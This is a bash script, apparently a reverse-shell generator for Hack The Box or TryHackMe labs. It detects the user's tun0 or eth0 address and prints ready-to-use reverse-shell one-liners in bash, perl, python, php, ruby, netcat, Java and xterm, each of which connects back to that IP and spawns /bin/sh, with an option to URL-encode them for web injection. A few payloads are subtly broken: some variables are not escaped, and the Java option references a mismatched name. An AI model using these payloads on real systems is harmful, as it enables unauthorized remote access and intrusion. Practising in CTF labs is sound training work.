#!/bin/bash

#command to grep the tun0 ip(htb or thm virtual ip)



error=$(cat /sys/class/net/tun0/operstate 2>/dev/null) # 2>/dev/null is used to suppress the error msg from cat if tun0 is not available

 

urlencode() {
    # urlencode <string>

    local length="${#1}"
    for (( i = 0; i < length; i++ )); do
        local c="${1:i:1}"
        case $c in
            [a-zA-Z0-9.~_-]) printf "$c" ;;
            *) printf '%s' "$c" | xxd -p -c1 |
                   while read c; do printf '%%%s' "$c"; done ;;
        esac
    done
}

die() {
	printf '%s\n' "$1" >&2
	exit 1
}


assign() {
if [ "$rev_shell" == "bash" ]
then
	rev_shell=$bash

elif [ "$rev_shell" == "python" ]
	then
		rev_shell=$python

elif [ "$rev_shell" == "php" ]
	then
		rev_shell=$php

elif [ "$rev_shell" == "nc" ]
	then
		rev_shell=$nc

elif [ "$rev_shell" == "ruby" ]
	then
		rev_shell=$ruby

elif [ "$rev_shell" == "perl" ]
	then
		rev_shell=$perl

elif [ "$rev_shell" == "java" ]
	then
		rev_shell=$Java

elif [ "$rev_shell" == "xterm" ]
	then
		rev_shell=$xterm

	
else
	echo not defined
fi
echo -e "Using IP: \e[1;35m$ip4\e[0m \n"
echo "Shell:"
echo -e "\e[1;38;5;220m$rev_shell\e[0m \n"

}


options=' Available shells \n 1.Bash \n 2.Python \n 3.Php \n 4.Ruby \n 5.Perl \n 6.Java \n 7.nc \n 8.xterm'
help='Usage: ./shells.sh -s [shell type] -[flag] \n -h \t\t\t\t show help \n -s \t\t\t\t select a shell \n -v \t\t\t\t use virtual ip address \n -l \t\t\t\t use local ip address \n -u \t\t\t\t url encode the shell \n -o \t\t\t\t show options/shells'


    if [ "$error" == "unknown" ]
	then
		ip4=$(/sbin/ip -o -4 addr list tun0 | awk '{print $4}' | cut -d/ -f1)
	else
		ip4=$(/sbin/ip -o -4 addr list eth0 | awk '{print $4}' | cut -d/ -f1)
	fi



while :; do
       case $1 in
           -h|-\?|--help)
               echo -e "$help"    # Display a usage synopsis.
               exit
               ;;
           -o|--options)
				echo -e "$options"
				exit
				;;
           -l|--local)       # Takes an option argument; ensure it has been specified.
               
               ip4=$(/sbin/ip -o -4 addr list eth0 | awk '{print $4}' | cut -d/ -f1)
               # echo "Using local ip address: $ip4"
               
               ;;

           -v|--virtual)
				

               if [ "$error" == "unknown" ]
				then

					ip4=$(/sbin/ip -o -4 addr list tun0 | awk '{print $4}' | cut -d/ -f1)
					# echo "Using virtual ip address: $ip4"
					
				else
					die 'ERROR:You are not connected to a virtual network'

				fi
               
               ;;
            -s|--shell)
				
				if [ "$2" ]
				then
					sh=1
					rev_shell="$2"
					shift
				else
					die 'ERROR: "--shell" requires a non-empty option argument.'
				fi
				;;

           -u|--url-encode)
				url=1
				shift

			   ;;
           --)              # End of all options.
               shift
               break
               ;;
           -?*)
               printf 'WARN: Unknown option (ignored): %s\n' "$1" >&2
               ;;
           *)               # Default case: No more options, so break out of the loop.
               break
       esac
   
       shift
   done



bash="bash -i >& /dev/tcp/$ip4/8080 0>&1"

perl="perl -e 'use Socket;$i=\"$ip4\";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"

python="python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$ip4\",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"

php="php -r '$sock=fsockopen(\"$ip4\",1234);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"

ruby="ruby -rsocket -e'f=TCPSocket.open(\"$ip4\",1234).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"

nc="nc -e /bin/sh $ip4 1234"

java="r = Runtime.getRuntime()
p = r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/$ip4/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done\"] as String[])
p.waitFor() "

xterm="xterm -display $ip4:1 (default port:6001)"


if [ $sh ]
then
	assign

	if [ $url ]
	then
		echo Url-encoded Shell:
		last= urlencode "$rev_shell" 2>/dev/null
		# echo  -e "\e[1;38;5;10m$last\e[0m \n"
		
	# else
	# 	echo "Enter the shell you want"
	# 	echo "Try -h for more options"	
	fi

fi

# echo -e "\e[1;38;5;220m$rev_shell\e[0m \n"